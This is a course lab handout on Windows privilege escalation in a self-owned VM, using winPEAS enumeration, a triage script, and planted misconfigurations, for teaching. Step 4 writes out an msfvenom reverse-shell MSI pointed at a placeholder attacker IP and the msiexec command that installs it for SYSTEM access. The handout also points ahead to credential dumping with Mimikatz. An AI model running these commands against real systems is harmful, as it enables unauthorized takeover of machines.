# Lab 11 — Escalate to SYSTEM on Windows

## Setup

**Windows VM required.** This lab needs a Windows host; Docker won't work here.

**Option A — Windows eval VM (local):**
1. Download the [Windows Server 2019/2022 eval ISO](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server)
   (180-day free trial, no license key).
2. Create a VM in VirtualBox or VMware. Snapshot the clean state before planting misconfigs.
3. Run the lab seeder (as Administrator in PowerShell):
   ```powershell
   git clone https://github.com/plaintext-security/plaintext-labs.git
   cd plaintext-labs\offensive\11-privesc-windows
   Set-ExecutionPolicy -Scope Process Bypass
   .\plant-misconfigs.ps1
   ```
4. Create a standard (non-admin) user: `net user labuser P@ssw0rd123 /add`

**Option B — Triage-only demo (no Windows needed):**
The triage tool runs on macOS/Linux against a sample winPEAS output:
```bash
git clone https://github.com/plaintext-security/plaintext-labs.git
cd plaintext-labs/offensive/11-privesc-windows
make demo
```

## Scenario

You've obtained a low-privilege shell as `labuser` on Meridian Financial's
application server. Enumerate the host with winPEAS, triage the findings, and
exploit the highest-confidence vector to reach SYSTEM.

> **Authorization note:** Only escalate on VMs you own or have explicit written
> authorisation to test. Never test against production systems.

## Do

1. [ ] Run the triage tool against the sample data to understand the output format:
   ```bash
   make demo          # triage on sample (no Windows needed)
   ```
   Note which vectors are P0 (reliable) vs P3 (informational).

2. [ ] On the Windows VM — download and run winPEAS as `labuser`:
   ```powershell
   # From labuser session (standard user):
   Invoke-WebRequest https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe -OutFile winPEAS.exe
   .\winPEAS.exe | Out-File winpeas_out.txt
   ```
   Then copy `winpeas_out.txt` to your analysis machine and run:
   ```bash
   python3 triage.py winpeas_out.txt
   ```

3. [ ] From the triage output, confirm the P0 vectors match what `plant-misconfigs.ps1` planted:
   - `AlwaysInstallElevated`: both HKLM and HKCU keys set to 1
   - Unquoted service path: `MeridianUpdater`
   - Weak service binary ACL: `Everyone [FullControl]` on the service binary

4. [ ] Exploit **AlwaysInstallElevated** (P0 — most reliable):
   On Kali/Linux: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-IP> LPORT=4444 -f msi > shell.msi`
   Then on the Windows VM: `msiexec /quiet /qn /i \\<your-IP>\share\shell.msi`
   Confirm SYSTEM with: `whoami`

5. [ ] Exploit the **unquoted service path** (P1):
   - What path would Windows search before finding the real service binary?
   - Create a stub at that path and restart the service.
   - What privilege does the service run as?

6. [ ] State the fix for each vector (see `triage.py` output for hints).

## Success criteria — you're done when

- [ ] You ran `triage.py` on real winPEAS output from the planted-misconfig VM.
- [ ] You escalated to SYSTEM via at least one P0 vector.
- [ ] You can explain the unquoted service path mechanism — why Windows searches multiple paths.
- [ ] You can state the remediation for all three planted misconfigs.

## Deliverables

`windows-privesc.md`: the three vectors (finding, exploit command, proof-of-SYSTEM output),
a comparison of P0 vs P1 reliability, and the fix for each.

## Automate & own it

**Required.** Extend `triage.py` to:
- Accept a winPEAS output file
- Add rules for at least two additional vectors (token privileges, writable PATH)
- Output a ranked report with an "exploit confidence" score per vector

AI drafts the additional regex rules; you validate each against real winPEAS output.
Commit the extended `triage.py` and `windows-privesc.md`.

## AI acceleration

Paste your `winPEAS` output (or a section of it) to a model and ask it to explain
the top-priority vector and the exact exploit preconditions. Then verify those
preconditions on the target before acting — models confidently miss a detail that
makes the exploit fail or crash the service.

## Connects forward

SYSTEM on a Windows host is the launchpad for Track 06 (Active Directory) — credential
dumping with Mimikatz, Pass-the-Hash, and Kerberoasting all start from a SYSTEM or
admin context. Module 12 (pivoting) shows how to use that access to reach adjacent hosts.

## Marketable proof

> "I enumerate and escalate privilege on Windows — AlwaysInstallElevated, unquoted
> service paths, and weak binary ACLs via winPEAS — and I can map each finding to the
> LOLBAS/registry fix."

## Stretch

- Research **PrintNightmare (CVE-2021-34527)**: how did it reach SYSTEM, and what
  Windows patch closed it?
- Run `accesschk.exe -uwcqv "labuser" *` and compare service ACL output to winPEAS
  findings. Which tool surfaces more service vectors?
